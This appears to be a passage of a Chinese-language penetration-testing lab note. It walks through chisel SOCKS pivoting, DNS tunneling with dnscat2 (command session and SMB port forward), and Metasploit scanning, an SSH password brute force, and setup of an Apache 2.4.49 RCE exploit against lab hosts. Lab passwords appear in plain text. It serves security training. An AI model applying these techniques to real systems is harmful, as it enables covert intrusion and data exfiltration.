可使用 `ss -ntplu` 檢查 SOCKS proxy 狀態
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu                                                                                              
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process               
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*                                              
tcp      LISTEN    0          4096               127.0.0.1:1080               0.0.0.0:*        users:(("chisel",pid=722835,fd=7))    
tcp      LISTEN    0          128                     [::]:22                    [::]:*                                              
tcp      LISTEN    0          511                        *:80                       *:*                                              
tcp      LISTEN    0          4096                       *:8080                     *:*        users:(("chisel",pid=722835,fd=3)) 
```
> SOCKS proxy port 1080 正在監聽

#### 5. 透過 SOCKS 代理存取內網
編輯 /etc/proxychains4.conf
```
socks5 127.0.0.1 1080
```
可以透過 proxychains 掃描內網 IP
```
proxychains nmap -sT -Pn -p22 10.4.223.215
```
將 Ncat 指令傳遞給 ProxyCommand。 建構指令告訴 Ncat 使用 socks5 協定和 `127.0.0.1:1080` proxy socket。 `%h`和 `%p` 代表 SSH command host and port values，SSH 將在執行命令之前填入這些值。
```
┌──(chw㉿CHW)-[~]
└─$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.223.215
The authenticity of host '10.4.223.215 (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
database_admin@pgdatabase01:~$ ls
```
> `-o ProxyCommand='...'`:指定一個 ProxyCommand，讓 SSH 透過 SOCKS5 代理伺服器連接目標主機 (10.4.223.215)\
> `--proxy-type socks5`：使用 SOCKS5 proxy (所有 SSH 連線請求都會經過 SOCKS5 Tunnel)\
`--proxy 127.0.0.1:1080`：SOCKS5 代理位於 127.0.0.1 的 1080 port (通常是 Chisel 或 ProxyChains 設定的 proxy server)\
`%h` 代表 目標主機 (10.4.223.215)
`%p` 代表 目標端口 (22，預設 SSH 端口)

## DNS Tunneling Theory and Practice
DNS 是一種 foundational Internet protocols。
DNS Tunneling attack 可分為兩種用途：
- 資料外洩 (Exfiltration)：把 sensitive data 嵌入 DNS 查詢，送出網路防火牆。
- 資料滲透 (Infiltration)：把 cmd 或惡意程式藏在 DNS 回應中，傳入受害網路。
### DNS Tunneling Fundamentals
- DNS 查詢流程
    - Client 詢問 DNS [recursive resolver](https://en.wikipedia.org/wiki/Domain_Name_System#Recursive_and_caching_name_server) Server
    PGDATABASE01 想存取 `www.example.com`，但不知道 IP (A record)，因此向 MULTISERVER03 查詢。
        - DNS resolver 詢問 [Root name servers](https://en.wikipedia.org/wiki/Root_name_server)
    MULTISERVER03 會向 Root DNS Server 查詢， Root 伺服器回應：「這是 `.com` 的域名，你應該去問 `.com` 的 TLD Server。」
        - TLD Server 回應 ([Top-level domain](https://en.wikipedia.org/wiki/Top-level_domain))
    `.com` 的 TLD Server 告訴 MULTISERVER03：「負責 `example.com` 的是哪一台 Authoritative Name Server。」
        - [Authoritative name server](https://en.wikipedia.org/wiki/Name_server#Authoritative_name_server) 回應
    MULTISERVER03 問 `example.com` 的 Authoritative name server：「請問 `www.example.com` 的 IP 是什麼？」\
    Authoritative name server 回傳「9.10.11.12。」
    - DNS Server 回應 Client
    MULTISERVER03 把 `www.example.com` 的 IP 回傳給 PGDATABASE01，完成 DNS 解析。

![image](https://hackmd.io/_uploads/H1mdyo8syg.png)

[情境範例] \
觀察 PGDATABASE01 和 FELINEAUTHORITY 之間交換的 DNS 封包:
- FELINEAUTHORITY：這是網路內的 Authoritative name server，負責解析 feline.corp 的 DNS 查詢。 (`192.168.114.7`)
- MULTISERVER03：這台伺服器充當 recursive resolver server，處理來自內部網路的 DNS 查詢。 (`192.168.114.64`)
- PGDATABASE01：內部伺服器，無法直接存取外部網路，但能透過 MULTISERVER03 查詢 DNS。 (`10.4.114.215`)

雖然 PGDATABASE01 不能直接連接到 FELINEAUTHORITY，但它可以連接到 MULTISERVER03。 MULTISERVER03 也配置為 PGDATABASE01 的 DNS 解析伺服器。
![image](https://hackmd.io/_uploads/SkGsJ6Lo1x.png)
> 我們現在有兩個 open shells：
> 1. Kali > (Confluence Injection) > CONFLUENCE01 > (SSH remote port forward) > PGDATABASE01 (database_admin user)
> 2. SSH directly into FELINEAUTHORITY (kali user)

為了模擬真實 DNS setup，利用 [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html) 在 FELINEAUTHORITY 設定為 DNS server。
#### 1. FELINEAUTHORITY 設定為 DNS 伺服器
```
┌──(chw㉿CHW)-[~/Chisel_x64]
└─$ ssh kali@192.168.114.7                  
The authenticity of host '192.168.114.7 (192.168.114.7)' can't be established.
ED25519 key fingerprint is SHA256:O14upfQq8jpAJjHJq+d90VrMcd1t3O4pdDgSl0XNSUM.
This key is not known by any other names.
...
Last login: Wed Mar 22 17:36:44 2023
kali@felineauthority:~$ cd dns_tunneling
kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```
> 設定 feline.corp 為 Authoritative Zone
```
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
[sudo] password for kali: 
dnsmasq: started, version 2.89 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache

```
>`-C`：指定要使用的 config\
>`-d`: 以 no-daemon mode，不會在背景執行
#### 2. 使用 tcpdump 監聽 DNS request
在 FELINEAUTHORITY 上監聽 UDP/53 以抓取 DNS 封包
```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

 現在 tcpdump 正在監聽，且 Dnsmasq 也在 FELINEAUTHORITY 運作

#### 3. PGDATABASE01 發送 DNS 查詢
使用 resolvectl 檢查 DNS 設定
```
database_admin@pgdatabase01:~$ resolvectl status
...             

Link 5 (ens224)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
...        
  Current DNS Server: 10.4.114.64
         DNS Servers: 10.4.114.64

Link 4 (ens192)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
...       
  Current DNS Server: 10.4.114.64
         DNS Servers: 10.4.114.64
```
> PGDATABASE01's DNS server is set to 10.4.114.64 (MULTISERVER03).

透過 nslookup 查詢 `exfiltrated-data.feline.corp`
```
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```
#### 4. 監視 DNS request
在 FELINEAUTHORITY 上，我們能夠看到 tcpdump 監測到的 DNS 封包，顯示 DNS 解析的過程：
```
tcpdump: 192.168.114.64.65122 > 192.168.114.4.domain: A? exfiltrated-data.feline.corp.
```
![image](https://hackmd.io/_uploads/SyJMGRUokg.png)

#### 5. 測試 TXT 記錄來滲透資料
在 FELINEAUTHORITY 上設定 TXT 記錄：
```
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```
#### 6. PGDATABASE01 發送 DNS 查詢 txt，確認 Server 回應
```
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.114.64
Address:	192.168.114.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:

database_admin@pgdatabase01:~$
```
### DNS Tunneling with dnscat2
如何使用 dnscat2 透過 DNS Tunneling 來滲透內網並傳輸資料，以及如何利用 dnscat2 進行 Port Forwarding
> DNS subdomain queries > exfiltrate data (竊取)\
> TXT (and other) records >  infiltrate data (滲透)

- [dnscat2](https://github.com/iagox86/dnscat2) 建立連線
    - 伺服器端 (FELINEAUTHORITY)：
        - 在 FELINEAUTHORITY（Authoritative DNS server）上 啟動 dnscat2-server，監聽 UDP 53 端口。
        - 使用 tcpdump 監視 DNS 流量。
        - 伺服器會解析來自 Target Machine (PGDATABASE01) 的 DNS 請求。
    - 客戶端 (PGDATABASE01)：
        - 在 PGDATABASE01 上執行 dnscat2-client，將 feline.corp 當作 DNS 查詢的目標。
        - 連線後，伺服器與客戶端都會顯示一組 驗證字串（例如："Annoy Mona Spiced Outran Stump Visas"），用來確保 未被中間人攻擊篡改。

#### 1. 啟動並監控 dnscat2-server 流量 
使用 tcpdump 檢查來自 FELINEAUTHORITY 53 port 的流量
```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```
啟動 dnscat2-server
```
kali@felineauthority:~$ dnscat2-server feline.corp

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```
> 監聽所有介面的 DNS Server，等待 dnscat2-client 連線\
> `feline.corp`當作唯一的參數

#### 2. 在 Target machine 執行 dnscat2-client
在 PGDATABASE01 執行 dnscat2-client， dnscat2-client 會發送 DNS 請求到 feline.corp。
```
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Annoy Mona Spiced Outran Stump Visas 

Session established!
```

如果連線成功，Client 和 Server 會顯示相同的驗證字串，用來確認連線未被篡改。

#### 3. tcpdump 監視 DNS Tunnel 的流量
```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)

```
可以看到 dnscat2 正在使用 TXT、CNAME、MX queries and responses。

#### 4. dnscat2-server 連線後 interacting cmd
- windows 列出所有 active
```
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
command (pgdatabase01) 1>
```
- listen 設定監聽端口
可以使用 listen 在 dnscat2 Server 上設定一個監聽端口，並透過 DNS Tunnel 推送 TCP 流量，在那裡它將 decapsulated 並推送到我們指定的內容。
```
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
```

#### 5. 嘗試透過 DNS Tunnel 連接到 SMB
連接到 HRSHARES 上的 SMB 端口，在 FELINEAUTHORITY 上監聽 4455 port，並在 HRSHARES 上轉送至 445。
```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1> 
```
```
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
Password for [WORKGROUP\hr_admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
    	scripts         Disk
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```
# The Metasploit Framework
尋找公開的 Exploit（漏洞利用代碼）並利用並不容易，Exploit Framework 整合各種 Exploit，並提供統一的使用方式，減少手動調整。\
透過 framework 中的 exploit，有效利用各種 payloads\

目前市面上有許多 Exploit 和後滲透框架:
- [Metasploit](https://www.metasploit.com/)
- [Covenant](https://github.com/cobbr/Covenant)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [PowerShellEmpire](https://github.com/BC-SECURITY/Empire)

Metasploit Framework 由 [Rapid7](https://www.rapid7.com/) 維護:
- 內建大量的 Exploit，涵蓋各種系統與應用程式漏洞。
- 包含輔助模組（Auxiliary Modules），可用於掃描、訊息收集與其他安全測試。
- 擁有多種動態 Payloads，可以根據需求選擇不同的攻擊方式。
- 可以自動化測試與攻擊流程，減少手動操作。

Kali Linux 預設已經安裝了 [metasploit-framework](https://www.kali.org/tools/metasploit-framework/) 套件

## Getting Familiar with Metasploit
熟悉 Metasploit Framework (MSF)，使用 Auxiliary [Modules](https://docs.rapid7.com/metasploit/modules/)
### Setup and Work with MSF
#### 1. 初始化 MSF database
```
┌──(chw㉿CHW)-[~]
└─$ sudo msfdb init
[sudo] password for chw: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```
#### 2. 啟動 PostgreSQL DB
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl enable postgresql
Synchronizing state of postgresql.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable postgresql
Created symlink '/etc/systemd/system/multi-user.target.wants/postgresql.service' → '/usr/lib/systemd/system/postgresql.service'.
```
#### 3. 啟動 Metasploit cmd line interface
```
┌──(chw㉿CHW)-[~]
└─$ sudo msfconsole                        
[sudo] password for chw: 
Metasploit tip: Save the current environment with the save command, 
future console restarts will use this environment again
...
       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
> 啟動畫面，其中包含：\
>- 可用的 Exploit（漏洞利用）
>- 輔助模組（Auxiliary Modules）
>- Post-Exploitation（後滲透）
>- Payload（攻擊載荷）
>- 編碼器（Encoders）
>- 反偵測模組（Evasion）
>> `sudo msfconsole -q`:不顯示內容

#### 4. 連線 PostgreSQL 資料庫
```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
> Metasploit 已經與 PostgreSQL 連接成功

#### - 熟悉 Metasploit 的命令
```
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    ...

Module Commands
===============

    Command       Description
    -------       -----------
    ...
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index

    
Job Commands
============

    Command       Description
    -------       -----------
    ...

Resource Script Commands
========================

    Command       Description
    -------       -----------
    ...

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    ...
    db_nmap           Executes nmap and records the output automatically
    ...
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces

Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database
    
Developer Commands
==================

    Command       Description
    -------       -----------
    ...
```
#### - 使用 Workspace 管理不同的測試專案
- 查看當前的 Workspace
```
msf6 > workspace
* default
```
- 建立新 Workspace
建立一個名為 pen200 的工作區
```
msf6 > workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
msf6 > workspace
  default
* pen200
```
#### - 使用 Nmap 掃描目標並儲存結果
Metasploit 內建了一個 db_nmap 指令，它可以直接使用 Nmap 掃描目標，並自動將結果存入資料庫。
```
msf6 > db_nmap
[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
msf6 > db_nmap -A 192.168.226.202
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
[*] Nmap: Nmap scan report for 192.168.50.202
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 993 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 21/tcp   open  ftp?
...
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
...
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
msf6 >
```
- 查看掃描到的主機: host
```
msf6 > hosts                                                                             
Hosts                                                                                                             
=====                                                                                                
address          mac  name  os_name       os_flavor  os_sp  purpose  info  comments                               
-------          ---  ----  -------       ---------  -----  -------  ----  --------                               
192.168.226.202             Windows 2016                    server
```
- 查看掃描到的服務: services
```
msf6 > services                                                                                                   
Services                                                                                                          
========

host             port  proto  name           state  info
----             ----  -----  ----           -----  ----
192.168.226.202  21    tcp    ftp            open   FileZilla ftpd 1.4.1
192.168.226.202  135   tcp    msrpc          open   Microsoft Windows RPC
192.168.226.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.226.202  445   tcp    microsoft-ds   open
192.168.226.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
192.168.226.202  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.226.202  8000  tcp    http           open   Golang net/http server Go-IPFS json-rpc or InfluxDB API

msf6 > services -p 8000
```

#### - 了解 Metasploit 模組
Metasploit 內建數千個模組，可以透過 `show` 指令查看:
```
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```
> 顯示模組的類別

如果要使用某個模組，例如 `auxiliary/scanner/portscan/tcp`：
```
msf6 > use auxiliary/scanner/portscan/tcp
```

### Auxiliary Modules
MSF 的 Auxiliary Modules 提供:\
👉🏻 資訊收集（Information Gathering）（gather/）\
👉🏻 端口掃描（Port Scanning）（scanner/）\
👉🏻 協議枚舉（Protocol Enumeration）（如 SMB、FTP、SSH）\
👉🏻 密碼攻擊（Password Attacks）\
👉🏻 模糊測試（Fuzzing）\
👉🏻 封包攔截（Sniffing）\
等其他功能

兩個最常見的 Auxiliary Modules 的語法和操作
#### - 列出所有 Modules
```
msf6 > show auxiliary

Auxiliary
=========

   #     Name                                                                     Disclosure Date  Rank    Check  Description
   -     ----                                                                     ---------------  ----    -----  -----------
   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                .                normal  No     Android Browser RCE Through Google Play Store XFO
   2     auxiliary/admin/appletv/appletv_display_image                            .                normal  No     Apple TV Image Remote Control
   3     auxiliary/admin/appletv/appletv_display_video                            .                normal  No
...
   1252  auxiliary/vsploit/malware/dns/dns_zeus                                   .                normal  No     VSploit Zeus DNS Query Module
   1253  auxiliary/vsploit/pii/email_pii                                          .                normal  No     VSploit Email PII
   1254  auxiliary/vsploit/pii/web_pii                                            .                normal  No     VSploit Web PII
```
#### - 搜尋特定的 Modules
使用 search 篩選
```
msf6 > search type:auxiliary smb

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   ...
   52  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
   53  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal  No     SMB Tree Connect Request Corruption
   54  auxiliary/fuzzers/smb/smb_tree_connect                                           normal  No     SMB Tree Connect Request Fuzzer
   55  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
   56  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
   ...


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
```
#### - 啟用特定的 Modules
可以使用 `use` 來啟動
```
msf6 > use auxiliary/scanner/smb/smb_version
```
或直接使用 index
```
msf6 > use 56
```
成功啟用後：
```
msf6 auxiliary(scanner/smb/smb_version) >
```
#### - 查看 Modules 資訊
啟用模組後，使用 `info` 查看詳細資訊
```
msf6 auxiliary(scanner/smb/smb_lookupsid) > info

       Name: SMB SID User Enumeration (LookupSid)
     Module: auxiliary/scanner/smb/smb_lookupsid
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>

Available actions:
    Name    Description
    ----    -----------
=>  DOMAIN  Enumerate domain accounts
    LOCAL   Enumerate local accounts

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  MaxRID  4000             no        Maximum RID to check
  MinRID  500              no        Starting RID to check


  Used when connecting via an existing SESSION:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   no        The session to run this module on


  Used when making a new connection via RHOSTS:

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                        t/basics/using-metasploit.html
  RPORT      445              no        The target port (TCP)
  SMBDomain  .                no        The Windows domain to use for authentication
  ...
```
`show options` 來顯示 Modules 的選項
```
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)...
   THREADS  1                yes       The number of concurrent threads (max one per host)
```
> 顯示 options `RHOSTS` 沒有設定值但是模組需要用到
#### - 設定 Modules 參數
使用 `set` 和 `unset` 從選項中新增或刪除值
```
msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 192.168.226.202
RHOSTS => 192.168.226.202
msf6 auxiliary(scanner/smb/smb_lookupsid) > unset RHOSTS
Unsetting RHOSTS...
```
但我們不需要手動設定 IP，如果已經使用 db_nmap 掃描過，可以讓 Metasploit 自動設定
```
msf6 auxiliary(scanner/smb/smb_lookupsid) > services -p 445 --rhosts
```
#### - 啟動 Modules
```
msf6 auxiliary(scanner/smb/smb_lookupsid) > run

[!] 192.168.226.202:445 - Unable to authenticate ([Rex::Proto::SMB::Exceptions::LoginError] Login Failed: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.).

SMB Lookup SIDs Output
======================

    Type  Name  RID
    ----  ----  ---

[*] 192.168.226.202: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
#### - 檢查漏洞
使用 `vulns` 指令來檢查是否發現漏洞
```
msf6 auxiliary(scanner/smb/smb_version) > vulns

Vulnerabilities
===============

Timestamp                Host            Name                         References
---------                ----            ----                         ----------
2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
                                                                      7429/overview-of-server-message-block-signing
```
> [SMB Signing is not required](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing) 相關漏洞 

更換 SSH module
```
msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
msf6 auxiliary(scanner/smb/smb_lookupsid) > use 15
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
msf6 auxiliary(scanner/ssh/ssh_login) > run
```
`creds` 查看可用的憑證
```
msf6 auxiliary(scanner/ssh/ssh_login) > creds
Credentials
===========

host            origin          service       public  private    realm  private_type  JtR Format
----            ------          -------       ------  -------    -----  ------------  ----------
192.168.226.201  192.168.226.201  2222/tcp (ssh)  george  chocolate         Password 
```
### Exploit Modules
[環境範例]
假設我們發現目標系統 WEB18 運行的是 Apache 2.4.49，並且透過漏洞掃描工具確認它 容易受到 CVE-2021-42013 攻擊，我們希望使用 Metasploit 來攻擊它並獲取存取權限。
#### 1. 搜尋適合的 Exploit Modules
```
msf6 > workspace -a exploits
[*] Added workspace: exploits
[*] Workspace: exploits
msf6 > search Apache 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1    \_ target: Automatic (Dropper)              .                .          .      .
   2    \_ target: Unix Command (In-Memory)         .                .          .      .
   3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
   4    \_ action: CHECK_RCE                        .                .          .      Check for RCE (if mod_cgi is enabled).
   5    \_ action: CHECK_TRAVERSAL                  .                .          .      Check for vulnerability.
   6    \_ action: READ_FILE                        .                .          .      Read file on the remote server.
```
> 列出兩個 Module: `exploit` 與 `auxiliary`

```
msf6 auxiliary(scanner/ssh/ssh_login) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x64, x86
...
Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Automatic (Dropper)
  1   Unix Command (In-Memory)

Check supported:
  Yes
...

```
> - 這個 Exploit 可以攻擊 Apache 2.4.49/2.4.50，並 RCE\
> - 支援 Unix 和 Linux 平台，適用於 x86 和 x64 架構\
> - 可能會留下攻擊痕跡（ioc-in-logs）並在磁碟上產生攻擊檔案（artifacts-on-disk）。
> - 可以多次執行，不會影響目標穩定性（repeatable-session）。
> - 可以使用 check 指令來驗證目標是否真的存在漏洞。

#### 2. 設定 Exploit 參數
查看可用參數
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
```
> `RHOSTS（目標 IP）`：需要設定\
